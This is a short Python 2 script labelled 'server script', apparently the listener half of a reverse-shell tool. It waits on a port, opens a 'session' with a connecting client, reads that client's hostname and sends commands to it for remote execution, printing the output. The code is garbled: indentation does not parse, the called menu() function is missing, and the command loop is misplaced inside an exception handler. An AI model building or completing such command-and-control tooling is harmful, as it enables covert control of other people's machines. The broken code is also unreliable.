#server script
import socket, os, sys
def socketCreate():
    try:
            global host
            global port
            global s 
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            host = ''
            port = raw_input('Type the port for istening: ')
            if port == '':
                socketCreate()
            port = int(port)
        except socket.error as msg:
            print ('Socket creation error: ' + str(msg[0]))
    def socketBind():
        try:
            print ('Binding socket at port %s'%(port))
            #s.bind will bind socket to the designated port
            s.bind((host,port))
            #s.listen will stand for maximum number of connections
            s.listen(1)
        except socket.error as msg:
            print ('Socket binding error: ' + str(msg[0]))
            print ('Retrying...')
            #in case of exceptions, it'll retry untill binding is successful.
            socketBind()
    def socketAccept():
            global Conn
            global addr
            global hostname
            try:
                conn, addr = s.accept()
                print ('[!] Session opened at %s:%s'%(addr[0],addr[1]))
                print ('\n')
                #will assign variable hostname to the hostname of remote client
                hostname = conn.recv(1024)
                menu()
            except socket.error as msg:
                print ('Socket Accepting error: ' + str(msg[0]))
                if cmd == 'quit':
                    conn.close()
                    s.close()
                    sys.exit()
                command = conn.send(cmd)
                result = conn.recv(16834)
                if result <> hostname:
                    print result

    def main():
            socketCreate()
            socketBind()
            socketAccept()

        main()


